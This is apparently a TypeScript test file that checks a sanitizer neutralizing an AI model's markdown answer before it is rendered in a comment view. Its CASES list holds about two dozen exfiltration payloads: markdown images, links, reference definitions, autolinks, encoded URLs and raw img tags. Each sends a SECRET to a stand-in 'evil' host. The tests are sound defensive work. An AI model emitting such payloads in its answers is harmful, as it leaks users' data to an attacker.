/**
 * Security r4 (N1): the model's answer, made inert on the server, rendered
 * through the comment view's own renderer (CommentBody — react-markdown +
 * remark-gfm, links → <a target=_blank>, no img override). Nothing may come
 * out as an <img> or an <a>. CommentBody does nothing special with
 * `[[…]]`: an undefined shortcut reference renders as its literal text.
 */
import { describe, it, expect } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { CommentBody } from "./MentionTextarea";
import { inertAnswer } from "../../../src/hootie/inert";

const CASES = [
  "![a [b] c](//evil/p.png?d=SECRET)",
  "[[x](//evil)",
  "![pixel](https://evil.example/p?d=SECRET)",
  "[the guide](https://evil.example/a)",
  "![x][r]\n\n[r]: https://evil.example/i?d=SECRET",
  "<https://evil.example/SECRET>",
  "see https://evil.example/SECRET and www.evil.example/SECRET",
  "![a [b [c]] d]( //evil/p?d=SECRET )",
  "[a](<//evil/SECRET>)",
  "![a] (//evil/SECRET)",
  "[[A]](https://evil.example/SECRET)",
  "[a]\n(//evil/SECRET)",
  "!https://a",
  "![link removed]\n\n> [link removed]: \\/\\/evil/p.png?d=SECRET",
  "![x]\n\n- [x]: &#47;&#47;evil/p.png?d=SECRET",
  "[x]\n\n[x]: /relative?d=SECRET",
  "[[A]][ref]\n\n[ref]: /p?d=SECRET",
  "&lt;img src=x&gt; <img src=\"//evil/SECRET\"> &#x5b;x&#x5d;&#x28;y&#x29;",
  "mail ops@evil.example or ping @(Chen Wei)",
  // r5 L1: no word boundary before the scheme or www.
  "_https://evil.example/SECRET",
  "1https://evil.example/SECRET",
  "_www.evil.example/SECRET",
  "[[x _https://evil.example/SECRET 1www.evil.example/SECRET]]",
];

const render = (body: string) => renderToStaticMarkup(<CommentBody body={body} members={[]} />);

describe("CommentBody renders an inert answer with no image and no link", () => {
  it("the raw cases DO produce images/links (the test is real)", () => {
    const raw = CASES.map(render).join("\n");
    expect(raw).toMatch(/<img/);
    expect(raw).toMatch(/<a /);
  });

  for (const c of CASES) {
    it(`no <img>/<a> for ${JSON.stringify(c).slice(0, 60)}`, () => {
      const html = render(inertAnswer(c));
      expect(html).not.toMatch(/<img/i);
      expect(html).not.toMatch(/<a[\s>]/i);
      expect(html).not.toContain("SECRET\"");
      expect(html).not.toMatch(/href=/i);
    });
  }

  it("[[wiki links]] and a parenthetical read as text", () => {
    const html = render(inertAnswer("See [[Doc]] (owner: Chen)."));
    expect(html).toContain("[[Doc]] (owner: Chen).");
    expect(html).not.toMatch(/<a[\s>]/);
  });
});
